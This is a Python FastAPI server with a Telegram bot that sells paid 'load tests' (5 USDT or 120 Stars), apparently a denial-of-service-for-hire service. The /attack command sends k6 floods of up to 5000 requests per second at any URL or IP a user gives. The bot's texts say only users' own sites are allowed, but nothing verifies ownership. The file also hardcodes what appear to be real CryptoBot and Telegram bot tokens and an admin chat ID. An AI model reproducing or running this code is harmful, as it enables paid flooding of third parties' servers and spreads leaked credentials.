import asyncio
import uuid
import time
import json
import os
import tempfile
import re
import urllib.request
import urllib.parse
from fastapi import FastAPI, HTTPException, Request
from fastapi.middleware.cors import CORSMiddleware
from fastapi.responses import FileResponse, JSONResponse
from pydantic import BaseModel
from typing import Optional

app = FastAPI()

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_methods=["*"],
    allow_headers=["*"],
)

TESTS = {}
PAYMENTS = {}
USER_PAYMENTS = {}  # user_id -> {paid: bool, test_id: str, ts}

# ============================================================
# ТОКЕНЫ
# ============================================================
CRYPTOBOT_TOKEN = os.environ.get("CRYPTOBOT_TOKEN", "615562:AAFfEdoOPDh7YfRHQbNIXGEIZpnHFc7B9r4")
TG_BOT_TOKEN = os.environ.get("TG_BOT_TOKEN", "8705350376:AAHwmgyNaoFgQfWPmb0_ZftRGAALz6t-qMU")
ADMIN_CHAT_ID = os.environ.get("ADMIN_CHAT_ID", "341311229")
PRICE_USD = 5
PRICE_STARS = 120
REQUIRED_CHANNEL = "@test_my_burger"
# ============================================================

bot_last_update_id = 0
bot_task = None
bot_username = "streiserbsssh_bot"


# ============================================================
# TELEGRAM API
# ============================================================

def tg_api(method, data=None):
    url = f"https://api.telegram.org/bot{TG_BOT_TOKEN}/{method}"
    if data:
        data = urllib.parse.urlencode(data).encode()
        req = urllib.request.Request(url, data=data)
    else:
        req = urllib.request.Request(url)
    try:
        resp = urllib.request.urlopen(req, timeout=30)
        return json.loads(resp.read().decode())
    except Exception as e:
        print(f"tg_api {method} failed:", e)
        return {"ok": False}


async def tg_send(chat_id, text, markdown=True, reply_markup=None):
    if not chat_id:
        return None
    try:
        url = f"https://api.telegram.org/bot{TG_BOT_TOKEN}/sendMessage"
        payload = {"chat_id": chat_id, "text": text}
        if markdown:
            payload["parse_mode"] = "Markdown"
        if reply_markup:
            payload["reply_markup"] = json.dumps(reply_markup)
        data = urllib.parse.urlencode(payload).encode()
        req = urllib.request.Request(url, data=data)
        loop = asyncio.get_event_loop()
        resp = await loop.run_in_executor(None, lambda: urllib.request.urlopen(req, timeout=10))
        return json.loads(resp.read().decode())
    except Exception as e:
        print("TG send failed:", e)
        return None


async def tg_send_invoice(chat_id, title, description, payload, amount_stars):
    """Отправляет invoice с оплатой в Telegram Stars (XTR)."""
    try:
        url = f"https://api.telegram.org/bot{TG_BOT_TOKEN}/sendInvoice"
        data = urllib.parse.urlencode({
            "chat_id": chat_id,
            "title": title,
            "description": description,
            "payload": payload,
            "currency": "XTR",
            "prices": json.dumps([{"label": "Load Test", "amount": amount_stars}]),
        }).encode()
        req = urllib.request.Request(url, data=data)
        loop = asyncio.get_event_loop()
        resp = await loop.run_in_executor(None, lambda: urllib.request.urlopen(req, timeout=15))
        return json.loads(resp.read().decode())
    except Exception as e:
        print("sendInvoice failed:", e)
        return {"ok": False, "error": str(e)}


async def check_subscription(user_id):
    """Проверяет подписан ли user на REQUIRED_CHANNEL."""
    try:
        res = await asyncio.get_event_loop().run_in_executor(
            None, lambda: tg_api("getChatMember", {
                "chat_id": REQUIRED_CHANNEL,
                "user_id": user_id
            })
        )
        if res.get("ok"):
            status = res.get("result", {}).get("status")
            return status in ("member", "administrator", "creator")
        return False
    except Exception as e:
        print("check_subscription error:", e)
        return False


# ============================================================
# МЕНЮ И ТЕКСТЫ (без эмодзи)
# ============================================================

BOT_MAIN_MENU = """`LOAD TESTER`

инструмент нагрузочного тестирования
сайтов и серверов

команды

/attack ip или url    запустить атаку
/status               текущий тест
/pricing              стоимость
/help                 помощь
/about                о сервисе

стоимость одного теста
`5 USDT` или `120 Stars`

правила
только свои сайты и серверы
максимум 5000 rps
до 5 минут на тест

панель
https://sds-s5j9.onrender.com"""

BOT_HELP = """`ПОМОЩЬ`

как запустить атаку

1. оплати тест
   /pricing для вариантов оплаты
   оплатить можно прямо в боте

2. после оплаты отправь
   `/attack https://site.com`
   или
   `/attack 1.2.3.4`

3. бот подтвердит и запустит
   результат придет в чат

команды
/attack   запуск атаки
/status   статус теста
/pricing  цены и оплата
/about    о сервисе

ограничения
только свои ресурсы
не больше 5000 rps
до 5 минут

безопасность
мы не несем ответственности
за использование против чужих ресурсов"""

BOT_ABOUT = """`О СЕРВИСЕ`

load tester — инструмент проверки
предела нагрузки на сайт или сервер

что проверяем
- предел по нагрузке
- скорость отклика
- стабильность
- ошибки
- восстановление

профили нагрузки
LIGHT    до 200 rps
MEDIUM   до 500 rps
HEAVY    до 1200 rps
ULTRA    до 2500 rps
MAX      до 5000 rps

кому нужно
- интернет магазинам
- api сервисам
- saas платформам
- инфраструктурным командам

легально
только собственные ресурсы
с подтвержденным владением"""

BOT_PRICING = """`СТОИМОСТЬ`

один тест
`5 USDT`
или
`120 Stars`

включает
- нагрузка до 5000 rps
- длительность до 5 минут
- отчёт со всеми метриками
- waterfall анализ
- рекомендации

оплатить

/pay_crypto   оплата в USDT
/pay_stars    оплата в Stars

после оплаты запусти атаку
`/attack url или ip`"""

BOT_NOT_SUBSCRIBED = """`ДОСТУП ЗАКРЫТ`

чтобы использовать бота
подпишись на канал

канал: @test_my_burger

после подписки нажми
/subscribed"""

BOT_SUBSCRIBED_OK = """`ПОДПИСКА ПОДТВЕРЖДЕНА`

доступ открыт

команды
/attack url или ip
/pricing
/status
/help"""

BOT_NEED_PAYMENT = """`ТРЕБУЕТСЯ ОПЛАТА`

оплати тест перед атакой

/pay_crypto   оплата в USDT
/pay_stars    оплата в Stars

стоимость
`5 USDT` или `120 Stars`

после оплаты повтори
`/attack url`"""


# ============================================================
# КНОПКИ
# ============================================================

def main_menu_keyboard():
    return {
        "inline_keyboard": [
            [{"text": "оплатить USDT", "callback_data": "pay_crypto"},
             {"text": "оплатить Stars", "callback_data": "pay_stars"}],
            [{"text": "цены", "callback_data": "pricing"},
             {"text": "помощь", "callback_data": "help"}],
            [{"text": "открыть панель", "url": "https://sds-s5j9.onrender.com"}],
        ]
    }


def sub_keyboard():
    return {
        "inline_keyboard": [
            [{"text": "подписаться", "url": f"https://t.me/{REQUIRED_CHANNEL.lstrip('@')}"}],
            [{"text": "проверить", "callback_data": "check_sub"}],
        ]
    }


# ============================================================
# ЛОГИКА БОТА
# ============================================================

async def bot_handle_message(msg):
    chat_id = str(msg["chat"]["id"])
    user_id = msg["from"]["id"]
    text = msg.get("text", "").strip()

    # проверка подписки (кроме /subscribed)
    if not text.startswith("/subscribed"):
        if not await check_subscription(user_id):
            await tg_send(chat_id, BOT_NOT_SUBSCRIBED, reply_markup=sub_keyboard())
            return

    if text.startswith("/start") or text.startswith("/subscribed"):
        await tg_send(chat_id, BOT_MAIN_MENU, reply_markup=main_menu_keyboard())
        return

    if text.startswith("/help"):
        await tg_send(chat_id, BOT_HELP)
        return

    if text.startswith("/about"):
        await tg_send(chat_id, BOT_ABOUT)
        return

    if text.startswith("/pricing") or text.startswith("/price"):
        await tg_send(chat_id, BOT_PRICING)
        return

    if text.startswith("/pay_crypto"):
        res = await cryptobot_create_invoice(PRICE_USD, user_id)
        if res.get("ok"):
            inv = res["result"]
            invoice_id = str(inv["invoice_id"])
            pay_url = inv.get("bot_invoice_url") or inv.get("pay_url")
            PAYMENTS[invoice_id] = {
                "paid": False,
                "created": time.time(),
                "amount": PRICE_USD,
                "user_id": user_id,
                "pay_url": pay_url,
            }
            await tg_send(chat_id,
                f"`СЧЕТ СОЗДАН`\n\n"
                f"сумма `{PRICE_USD} USDT`\n\n"
                f"открой ссылку ниже\n"
                f"после оплаты отправь\n"
                f"`/status` для проверки")
            # отправляем ссылку кнопкой
            await tg_send(chat_id,
                f"ссылка на оплату\n{pay_url}",
                reply_markup={"inline_keyboard": [[{"text": "ОПЛАТИТЬ", "url": pay_url}]]})

            # запускаем фоновую проверку
            asyncio.create_task(watch_payment_bot(invoice_id, user_id, chat_id))
        else:
            await tg_send(chat_id,
                f"`ОШИБКА СОЗДАНИЯ СЧЕТА`\n\n{res.get('error', 'unknown')}")
        return

    if text.startswith("/pay_stars"):
        payload = f"stars_{user_id}_{int(time.time())}"
        USER_PAYMENTS[f"stars_{user_id}"] = {
            "paid": False,
            "method": "stars",
            "payload": payload,
            "ts": time.time()
        }
        res = await tg_send_invoice(
            chat_id,
            "Load Test — 1 attack",
            "нагрузочный тест до 5000 rps",
            payload,
            PRICE_STARS
        )
        if not res.get("ok"):
            await tg_send(chat_id,
                f"`ОШИБКА`\n\nне удалось отправить счёт\n{res.get('error', 'unknown')}\n\n"
                f"убедись что в @BotFather включены платежи Telegram Stars")
        return

    if text.startswith("/attack"):
        parts = text.split(maxsplit=1)
        if len(parts) < 2:
            await tg_send(chat_id,
                "`ЗАПУСК АТАКИ`\n\n"
                "укажи url или ip\n\n"
                "примеры\n"
                "`/attack https://example.com`\n"
                "`/attack 1.2.3.4`\n"
                "`/attack 1.2.3.4:8080`")
            return

        target = parts[1].strip()

        # проверка оплаты
        if not user_has_payment(user_id):
            await tg_send(chat_id, BOT_NEED_PAYMENT)
            return

        # нормализация
        if not target.startswith(("http://", "https://")):
            # ip или домен без схемы
            if re.match(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}(:\d+)?$', target):
                target_url = "http://" + target
            else:
                target_url = "https://" + target
        else:
            target_url = target

        await tg_send(chat_id,
            f"`АТАКА ЗАПУЩЕНА`\n\n"
            f"цель `{target_url}`\n"
            f"профиль MAX до 5000 rps\n"
            f"длительность 60 сек\n\n"
            f"результат придет в чат")

        # списываем оплату
        consume_payment(user_id)

        # запускаем тест
        test_id = str(uuid.uuid4())[:8]
        req = StartRequest(
            target=target_url,
            pps=5000,
            duration=60,
            pattern="ramp",
            timeout=10,
            user_agent="Mozilla/5.0 (LoadTester)",
            tg_chat_id=chat_id
        )
        TESTS[test_id] = {
            "id": test_id,
            "target": target_url,
            "pps": 5000,
            "duration": 60,
            "pattern": "ramp",
            "method": "GET",
            "status": "starting",
            "started": time.time(),
            "is_ladder": False,
            "user_id": user_id,
        }
        asyncio.create_task(run_k6(test_id, req))

        # уведомим админа
        await tg_send(ADMIN_CHAT_ID,
            f"`НОВАЯ АТАКА`\n\n"
            f"юзер `{user_id}`\n"
            f"цель `{target_url}`\n"
            f"test_id `{test_id}`")
        return

    if text.startswith("/status"):
        # найдем последний тест юзера
        user_tests = [t for t in TESTS.values() if isinstance(t, dict) and t.get("user_id") == user_id]
        if not user_tests:
            await tg_send(chat_id, "`СТАТУС`\n\nактивных тестов нет")
            return
        last = user_tests[-1]
        await tg_send(chat_id,
            f"`СТАТУС`\n\n"
            f"id `{last['id']}`\n"
            f"цель `{last['target']}`\n"
            f"статус `{last['status']}`\n"
            f"прошло `{int(time.time() - last['started'])}s`")
        return

    # неизвестная
    await tg_send(chat_id,
        "`НЕИЗВЕСТНАЯ КОМАНДА`\n\n"
        "команды\n"
        "/attack url\n"
        "/status\n"
        "/pricing\n"
        "/pay_crypto\n"
        "/pay_stars\n"
        "/help")


def user_has_payment(user_id):
    key = f"paid_{user_id}"
    p = USER_PAYMENTS.get(key)
    if not p or not p.get("paid"):
        return False
    # срок действия оплаты 24 часа
    if time.time() - p.get("ts", 0) > 86400:
        return False
    return True


def grant_payment(user_id, method="crypto"):
    key = f"paid_{user_id}"
    USER_PAYMENTS[key] = {
        "paid": True,
        "method": method,
        "ts": time.time()
    }


def consume_payment(user_id):
    key = f"paid_{user_id}"
    if key in USER_PAYMENTS:
        USER_PAYMENTS[key]["paid"] = False
        USER_PAYMENTS[key]["consumed_at"] = time.time()


async def watch_payment_bot(invoice_id, user_id, chat_id):
    """Фоновая проверка оплаты крипты для юзера из бота."""
    for _ in range(400):  # 20 минут (3 сек интервал)
        await asyncio.sleep(3)
        p = PAYMENTS.get(invoice_id)
        if not p:
            return
        if p.get("paid"):
            grant_payment(user_id, "crypto")
            await tg_send(chat_id,
                f"`ОПЛАТА ПОЛУЧЕНА`\n\n"
                f"метод USDT\n"
                f"сумма `{PRICE_USD} USDT`\n\n"
                f"теперь можешь запустить атаку\n"
                f"`/attack url`")
            return

        # опрос криптобота
        result = await cryptobot_check_invoice(invoice_id)
        if result.get("ok"):
            items = result.get("result", {}).get("items", [])
            if items and items[0].get("status") == "paid":
                p["paid"] = True
                p["paid_at"] = time.time()
                grant_payment(user_id, "crypto")
                await tg_send(chat_id,
                    f"`ОПЛАТА ПОЛУЧЕНА`\n\n"
                    f"метод USDT\n"
                    f"сумма `{PRICE_USD} USDT`\n\n"
                    f"теперь можешь запустить атаку\n"
                    f"`/attack url`")
                return


async def bot_handle_callback(cb):
    chat_id = str(cb["message"]["chat"]["id"])
    user_id = cb["from"]["id"]
    data = cb.get("data", "")

    if data == "check_sub":
        if await check_subscription(user_id):
            await tg_send(chat_id, BOT_SUBSCRIBED_OK, reply_markup=main_menu_keyboard())
        else:
            await tg_send(chat_id, BOT_NOT_SUBSCRIBED, reply_markup=sub_keyboard())
        return

    if data == "pay_crypto":
        if not await check_subscription(user_id):
            await tg_send(chat_id, BOT_NOT_SUBSCRIBED, reply_markup=sub_keyboard())
            return
        res = await cryptobot_create_invoice(PRICE_USD, user_id)
        if res.get("ok"):
            inv = res["result"]
            invoice_id = str(inv["invoice_id"])
            pay_url = inv.get("bot_invoice_url") or inv.get("pay_url")
            PAYMENTS[invoice_id] = {
                "paid": False, "created": time.time(),
                "amount": PRICE_USD, "user_id": user_id, "pay_url": pay_url
            }
            await tg_send(chat_id, f"ссылка на оплату\n{pay_url}",
                reply_markup={"inline_keyboard": [[{"text": "ОПЛАТИТЬ", "url": pay_url}]]})
            asyncio.create_task(watch_payment_bot(invoice_id, user_id, chat_id))
        else:
            await tg_send(chat_id, f"`ОШИБКА`\n\n{res.get('error', 'unknown')}")
        return

    if data == "pay_stars":
        if not await check_subscription(user_id):
            await tg_send(chat_id, BOT_NOT_SUBSCRIBED, reply_markup=sub_keyboard())
            return
        payload = f"stars_{user_id}_{int(time.time())}"
        res = await tg_send_invoice(chat_id, "Load Test — 1 attack",
            "нагрузочный тест до 5000 rps", payload, PRICE_STARS)
        if not res.get("ok"):
            await tg_send(chat_id,
                f"`ОШИБКА`\n\n{res.get('error', 'unknown')}\n\n"
                f"проверь что в @BotFather включены платежи Stars")
        return

    if data == "pricing":
        await tg_send(chat_id, BOT_PRICING)
        return

    if data == "help":
        await tg_send(chat_id, BOT_HELP)
        return


async def bot_handle_pre_checkout(q):
    """Ответ на pre_checkout_query для Stars — обязательно ok:true."""
    query_id = q["id"]
    try:
        url = f"https://api.telegram.org/bot{TG_BOT_TOKEN}/answerPreCheckoutQuery"
        data = urllib.parse.urlencode({"pre_checkout_query_id": query_id, "ok": "true"}).encode()
        req = urllib.request.Request(url, data=data)
        await asyncio.get_event_loop().run_in_executor(
            None, lambda: urllib.request.urlopen(req, timeout=10))
    except Exception as e:
        print("answerPreCheckout failed:", e)


async def bot_handle_successful_payment(msg):
    """Юзер оплатил Stars."""
    chat_id = str(msg["chat"]["id"])
    user_id = msg["from"]["id"]
    payment = msg.get("successful_payment", {})
    payload = payment.get("invoice_payload", "")

    grant_payment(user_id, "stars")
    await tg_send(chat_id,
        f"`ОПЛАТА ПОЛУЧЕНА`\n\n"
        f"метод Stars\n"
        f"сумма `{PRICE_STARS} Stars`\n\n"
        f"теперь можешь запустить атаку\n"
        f"`/attack url`")
    await tg_send(ADMIN_CHAT_ID,
        f"`ОПЛАТА STARS`\n\nюзер `{user_id}`\nсумма `{PRICE_STARS}`")


async def bot_polling_loop():
    global bot_last_update_id, bot_username
    print("TG bot polling started")
    await asyncio.sleep(3)

    # узнаём username бота
    me = tg_api("getMe")
    if me.get("ok"):
        bot_username = me["result"]["username"]
        print("Bot username:", bot_username)

    while True:
        try:
            res = await asyncio.get_event_loop().run_in_executor(
                None, lambda: tg_api("getUpdates", {
                    "offset": bot_last_update_id + 1,
                    "timeout": 25
                })
            )
            if res.get("ok"):
                for upd in res.get("result", []):
                    bot_last_update_id = upd["update_id"]
                    try:
                        if "message" in upd:
                            m = upd["message"]
                            if "successful_payment" in m:
                                await bot_handle_successful_payment(m)
                            else:
                                await bot_handle_message(m)
                        elif "callback_query" in upd:
                            await bot_handle_callback(upd["callback_query"])
                        elif "pre_checkout_query" in upd:
                            await bot_handle_pre_checkout(upd["pre_checkout_query"])
                    except Exception as e:
                        print("handle error:", e)
        except Exception as e:
            print("bot poll error:", e)
        await asyncio.sleep(1)


@app.on_event("startup")
async def startup_event():
    global bot_task
    if TG_BOT_TOKEN and TG_BOT_TOKEN != "PASTE_YOUR_BOT_TOKEN_HERE":
        bot_task = asyncio.create_task(bot_polling_loop())
        print("Bot task scheduled")


# ============================================================
# CRYPTOBOT
# ============================================================

async def cryptobot_create_invoice(amount_usd: float, user_id=None) -> dict:
    try:
        url = "https://pay.crypt.bot/api/createInvoice"
        body = json.dumps({
            "asset": "USDT",
            "amount": str(amount_usd),
            "description": "Load Tester — 1 test",
            "expires_in": 3600,
            "paid_btn_name": "openBot",
            "paid_btn_url": f"https://t.me/{bot_username}"
        }).encode()
        req = urllib.request.Request(
            url, data=body,
            headers={
                "Crypto-Pay-API-Token": CRYPTOBOT_TOKEN,
                "Content-Type": "application/json"
            }
        )
        loop = asyncio.get_event_loop()
        resp = await loop.run_in_executor(None, lambda: urllib.request.urlopen(req, timeout=15))
        data = json.loads(resp.read().decode())
        print("CryptoBot invoice OK:", data.get("ok"))
        return data
    except Exception as e:
        print("CryptoBot invoice error:", e)
        return {"ok": False, "error": str(e)}


async def cryptobot_check_invoice(invoice_id) -> dict:
    try:
        url = f"https://pay.crypt.bot/api/getInvoices?invoice_ids={invoice_id}"
        req = urllib.request.Request(url, headers={"Crypto-Pay-API-Token": CRYPTOBOT_TOKEN})
        loop = asyncio.get_event_loop()
        resp = await loop.run_in_executor(None, lambda: urllib.request.urlopen(req, timeout=10))
        return json.loads(resp.read().decode())
    except Exception as e:
        return {"ok": False, "error": str(e)}


class StartRequest(BaseModel):
    target: str
    pps: int = 200
    duration: int = 60
    method: str = "GET"
    headers: Optional[dict] = None
    body: Optional[str] = None
    pattern: str = "steady"
    timeout: int = 5
    user_agent: Optional[str] = None
    cookie: Optional[str] = None
    strict: bool = False
    tg_chat_id: Optional[str] = None
    steps: Optional[list] = None
    invoice_id: Optional[str] = None


@app.post("/api/invoice")
async def create_invoice():
    result = await cryptobot_create_invoice(PRICE_USD)
    if not result.get("ok"):
        raise HTTPException(500, "invoice creation failed: " + str(result.get("error")))
    inv = result["result"]
    invoice_id = str(inv["invoice_id"])
    PAYMENTS[invoice_id] = {
        "paid": False, "created": time.time(),
        "amount": PRICE_USD,
        "pay_url": inv.get("bot_invoice_url") or inv.get("pay_url"),
    }
    await tg_send(ADMIN_CHAT_ID,
        f"`НОВЫЙ СЧЕТ`\n\nID: `{invoice_id}`\nСумма: `{PRICE_USD} USDT`")
    return {
        "invoice_id": invoice_id,
        "pay_url": PAYMENTS[invoice_id]["pay_url"],
        "amount": PRICE_USD,
    }


@app.get("/api/invoice/check/{invoice_id}")
async def check_invoice(invoice_id: str):
    if invoice_id not in PAYMENTS:
        raise HTTPException(404, "invoice not found")
    p = PAYMENTS[invoice_id]
    if p["paid"]:
        return {"paid": True, "invoice_id": invoice_id}
    result = await cryptobot_check_invoice(invoice_id)
    if result.get("ok"):
        items = result.get("result", {}).get("items", [])
        if items and items[0].get("status") == "paid":
            p["paid"] = True
            p["paid_at"] = time.time()
            await tg_send(ADMIN_CHAT_ID, f"`ОПЛАТА ПОЛУЧЕНА`\n\nID: `{invoice_id}`")
            return {"paid": True, "invoice_id": invoice_id}
    return {"paid": False, "invoice_id": invoice_id}


@app.post("/api/cryptobot-webhook")
async def cryptobot_webhook(request: Request):
    try:
        data = await request.json()
    except Exception:
        return JSONResponse({"ok": False})
    if data.get("update_type") == "invoice_paid":
        payload = data.get("payload", {})
        invoice_id = str(payload.get("invoice_id"))
        if invoice_id in PAYMENTS:
            PAYMENTS[invoice_id]["paid"] = True
            PAYMENTS[invoice_id]["paid_at"] = time.time()
        await tg_send(ADMIN_CHAT_ID, f"`ОПЛАТА ПОЛУЧЕНА`\n\nID: `{invoice_id}`")
    return {"ok": True}


def build_stages(req: StartRequest):
    if req.steps:
        step_time = max(5, req.duration // len(req.steps))
        stages = []
        for p in req.steps:
            stages.append(f"{{ duration: '{step_time}s', target: {p} }}")
        stages.append(f"{{ duration: '5s', target: 0 }}")
        return "stages: [" + ", ".join(stages) + "],", max(req.steps)

    pps = req.pps
    d = req.duration

    if req.pattern == "ramp":
        return f"""stages: [
            {{ duration: '{max(1,int(d*0.25))}s', target: {max(1, pps//5)} }},
            {{ duration: '{max(1,int(d*0.5))}s', target: {pps} }},
            {{ duration: '{max(1,int(d*0.25))}s', target: {max(1, pps//2)} }},
        ],""", pps
    elif req.pattern == "spike":
        return f"""stages: [
            {{ duration: '{max(1,int(d*0.4))}s', target: {max(1, pps//10)} }},
            {{ duration: '{max(1,int(d*0.2))}s', target: {pps} }},
            {{ duration: '{max(1,int(d*0.4))}s', target: {max(1, pps//10)} }},
        ],""", pps
    elif req.pattern == "wave":
        half = max(1, d // 6)
        return f"""stages: [
            {{ duration: '{half}s', target: {pps} }},
            {{ duration: '{half}s', target: {max(1, pps//5)} }},
            {{ duration: '{half}s', target: {pps} }},
            {{ duration: '{half}s', target: {max(1, pps//5)} }},
            {{ duration: '{half}s', target: {pps} }},
            {{ duration: '{half}s', target: {max(1, pps//5)} }},
        ],""", pps
    else:
        return f"stages: [ {{ duration: '{d}s', target: {pps} }} ],", pps


def build_k6_script(req: StartRequest) -> str:
    method = req.method.upper()
    headers = dict(req.headers or {})
    if req.user_agent:
        headers["User-Agent"] = req.user_agent
    if req.cookie:
        headers["Cookie"] = req.cookie

    headers_json = json.dumps(headers)
    body_json = json.dumps(req.body or "")

    stages_str, max_pps = build_stages(req)
    pre_vus = min(max(max_pps, 10), 6000)
    max_vus = min(max(max_pps * 3, 20), 12000)

    redirects = "false" if req.strict else "true"
    ok_expr = "(r.status === 200)" if req.strict else "(r.status >= 200 && r.status < 400)"

    script = f"""
import http from 'k6/http';
import {{ check }} from 'k6';

export const options = {{
    {stages_str}
    preAllocatedVUs: {pre_vus},
    maxVUs: {max_vus},
    timeout: '{req.timeout}s',
    thresholds: {{}},
    summaryTrendStats: ['avg','min','med','p(50)','p(90)','p(95)','p(99)','max'],
    noConnectionReuse: false,
    discardResponseBodies: true,
}};

const TARGET = {json.dumps(req.target)};
const METHOD = {json.dumps(method)};
const HEADERS = {headers_json};
const BODY = {body_json};

export default function () {{
    const params = {{ headers: HEADERS, redirects: {redirects}, timeout: '{req.timeout}s' }};
    let res;
    if (METHOD === 'GET' || METHOD === 'HEAD') {{
        res = http.request(METHOD, TARGET, null, params);
    }} else {{
        res = http.request(METHOD, TARGET, BODY, params);
    }}
    check(res, {{ 'ok': (r) => {ok_expr} }});
}}
"""
    return script


def parse_k6_summary(raw: str) -> dict:
    if not raw:
        return {}
    matches = list(re.finditer(r'\{"metrics":\s*\{', raw))
    if matches:
        start = matches[-1].start()
        depth = 0; i = start; in_string = False; escape = False
        while i < len(raw):
            ch = raw[i]
            if escape: escape = False; i += 1; continue
            if ch == '\\': escape = True; i += 1; continue
            if ch == '"': in_string = not in_string; i += 1; continue
            if not in_string:
                if ch == '{': depth += 1
                elif ch == '}':
                    depth -= 1
                    if depth == 0:
                        try: return json.loads(raw[start:i+1])
                        except Exception: pass
            i += 1
    return {}


async def run_k6(test_id: str, req: StartRequest):
    script = build_k6_script(req)
    tmp = tempfile.NamedTemporaryFile(mode="w", suffix=".js", delete=False)
    tmp.write(script)
    tmp.close()

    summary_file = f"/tmp/k6sum_{test_id}.json"
    stream_file = f"/tmp/k6stream_{test_id}.json"

    proc = await asyncio.create_subprocess_exec(
        "k6", "run",
        "--summary-mode=full",
        f"--summary-export={summary_file}",
        f"--out=json={stream_file}",
        tmp.name,
        stdout=asyncio.subprocess.PIPE,
        stderr=asyncio.subprocess.PIPE,
    )
    TESTS[test_id]["proc"] = proc
    TESTS[test_id]["status"] = "running"
    TESTS[test_id]["started"] = time.time()
    TESTS[test_id]["stream_file"] = stream_file
    TESTS[test_id]["stream_pos"] = 0

    stdout_data = b""
    try:
        stdout_data, _ = await asyncio.wait_for(
            proc.communicate(), timeout=req.duration * 3 + 180
        )
        TESTS[test_id]["status"] = "finished"
    except asyncio.TimeoutError:
        try: proc.kill()
        except Exception: pass
        TESTS[test_id]["status"] = "timeout"
    except Exception as e:
        TESTS[test_id]["status"] = "error"
        TESTS[test_id]["error"] = str(e)
    finally:
        stdout_text = stdout_data.decode('utf-8', errors='ignore') if stdout_data else ""
        summary = {}
        try:
            with open(summary_file, "r") as f:
                summary = json.load(f)
        except Exception as e:
            print(f"summary file failed: {e}")
        if not summary or not summary.get("metrics"):
            summary = parse_k6_summary(stdout_text)

        TESTS[test_id]["summary"] = summary
        TESTS[test_id]["finished"] = time.time()

        if summary:
            TESTS[test_id]["recovery"] = await check_recovery(req.target, req.timeout)

        try: os.unlink(tmp.name)
        except Exception: pass
        try: os.unlink(summary_file)
        except Exception: pass

        # уведомление в чат юзера
        if req.tg_chat_id and summary:
            m = summary.get("metrics", {})
            reqs = m.get("http_reqs", {}) or {}
            dur = m.get("http_req_duration", {}) or {}
            failed = m.get("http_req_failed", {}) or {}
            errRate = round((failed.get("value", 0) or 0) * 100, 2)
            await tg_send(req.tg_chat_id,
                f"`АТАКА ЗАВЕРШЕНА`\n\n"
                f"цель `{req.target}`\n\n"
                f"rps `{round(reqs.get('rate', 0), 1)}`\n"
                f"всего запросов `{reqs.get('count', 0)}`\n"
                f"p50 `{round(dur.get('p(50)', 0))}ms`\n"
                f"p95 `{round(dur.get('p(95)', 0))}ms`\n"
                f"p99 `{round(dur.get('p(99)', 0))}ms`\n"
                f"ошибки `{errRate}%`")


async def check_recovery(target: str, timeout: int) -> dict:
    import urllib.request
    start = time.time()
    first_ok_at = None
    checks = 0
    ok_checks = 0
    for _ in range(30):
        await asyncio.sleep(1)
        checks += 1
        try:
            req = urllib.request.Request(target, method="HEAD",
                headers={"User-Agent": "LoadTester-Recovery/1.0"})
            loop = asyncio.get_event_loop()
            resp = await asyncio.wait_for(
                loop.run_in_executor(None, lambda: urllib.request.urlopen(req, timeout=timeout)),
                timeout=timeout + 1
            )
            if resp.status < 500:
                ok_checks += 1
                if first_ok_at is None:
                    first_ok_at = time.time() - start
        except Exception:
            pass
    return {
        "checks": checks,
        "ok_checks": ok_checks,
        "first_ok_after_sec": round(first_ok_at, 1) if first_ok_at is not None else None,
        "available_percent": round(ok_checks / checks * 100, 1) if checks else 0,
    }


@app.post("/api/start")
async def start(req: StartRequest):
    if req.invoice_id:
        p = PAYMENTS.get(req.invoice_id)
        if not p or not p.get("paid"):
            raise HTTPException(402, "payment required")

    if not req.target.startswith(("http://", "https://")):
        req.target = "http://" + req.target

    test_id = str(uuid.uuid4())[:8]
    TESTS[test_id] = {
        "id": test_id,
        "target": req.target,
        "pps": req.pps,
        "duration": req.duration,
        "pattern": req.pattern,
        "method": req.method,
        "status": "starting",
        "started": time.time(),
        "is_ladder": bool(req.steps),
    }
    asyncio.create_task(run_k6(test_id, req))
    return {"id": test_id}


@app.get("/api/status/{test_id}")
async def status(test_id: str):
    t = TESTS.get(test_id)
    if not t or not isinstance(t, dict) or "started" not in t:
        raise HTTPException(404, "test not found")
    elapsed = time.time() - t["started"]
    remaining = max(0, t["duration"] - elapsed)
    resp = {
        "id": test_id, "status": t["status"],
        "elapsed": round(elapsed, 1), "remaining": round(remaining, 1),
        "target": t["target"], "pps": t["pps"],
        "is_ladder": t.get("is_ladder", False),
    }
    if t["status"] in ("finished", "timeout", "stopped", "error"):
        resp["summary"] = t.get("summary", {})
        resp["recovery"] = t.get("recovery", {})
        if t.get("error"):
            resp["error"] = t["error"]
    return resp


@app.get("/api/stream/{test_id}")
async def stream(test_id: str):
    t = TESTS.get(test_id)
    if not t or not isinstance(t, dict):
        raise HTTPException(404, "test not found")
    path = t.get("stream_file")
    if not path or not os.path.exists(path):
        return {"lines": [], "pos": 0}
    pos = t.get("stream_pos", 0)
    lines = []
    try:
        with open(path, "r") as f:
            f.seek(pos)
            for line in f:
                line = line.strip()
                if not line: continue
                try:
                    lines.append(json.loads(line))
                except Exception:
                    pass
            new_pos = f.tell()
        t["stream_pos"] = new_pos
    except Exception as e:
        return {"lines": [], "pos": pos, "error": str(e)}
    return {"lines": lines[-200:], "pos": t["stream_pos"]}


@app.post("/api/stop/{test_id}")
async def stop(test_id: str):
    t = TESTS.get(test_id)
    if not t or not isinstance(t, dict):
        raise HTTPException(404, "test not found")
    proc = t.get("proc")
    if proc and proc.returncode is None:
        try: proc.kill()
        except Exception: pass
        t["status"] = "stopped"
    return {"ok": True}


@app.get("/")
async def root():
    return FileResponse("index.html")


@app.get("/health")
async def health():
    return {"ok": True, "bot_running": bot_task is not None and not bot_task.done()}
